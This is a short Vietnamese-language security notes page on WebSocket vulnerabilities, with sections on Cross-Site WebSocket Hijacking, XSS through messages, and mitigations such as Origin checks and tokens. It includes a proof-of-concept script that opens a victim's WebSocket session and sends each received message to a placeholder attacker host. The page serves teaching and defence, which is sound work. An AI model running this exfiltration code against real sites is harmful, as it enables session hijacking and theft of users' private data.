# 🔌 WebSockets Security

## 1. 📌 Tổng quan
WebSocket cung cấp kênh giao tiếp hai chiều liên tục (Full-duplex) giữa Client và Server qua một kết nối TCP duy nhất. Các lỗ hổng bảo mật WebSocket thường bao gồm Cross-Site WebSocket Hijacking (CSWSH), can thiệp message (Manipulating messages) dẫn đến SQLi, XSS, hoặc bypass rate limit.

---

## 2. 💣 Kỹ thuật khai thác

### 1. Cross-Site WebSocket Hijacking (CSWSH):
Tương tự CSRF nhưng trên kết nối WebSocket Handshake. Khi server chỉ dùng Cookie để xác thực Handshake mà không kiểm tra Origin header hoặc Anti-CSRF Token:
```html
<script>
    var ws = new WebSocket('wss://vulnerable-website.com/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://attacker-collaborator.com/log?msg=' + encodeURIComponent(event.data));
    };
</script>
```

### 2. XSS qua WebSocket Messages:
Chèn payload XSS vào trong message WebSocket khi server phản hồi message cho các client khác mà không encode.

---

## 3. 🛡️ Biện pháp phòng chống (Mitigation)
1. Sử dụng giao thức bảo mật `wss://` thay vì `ws://`.
2. Kiểm tra chặt chẽ header `Origin` trong quá trình WebSocket Handshake.
3. Sử dụng One-time token hoặc Anti-CSRF token khi thiết lập kết nối WebSocket.
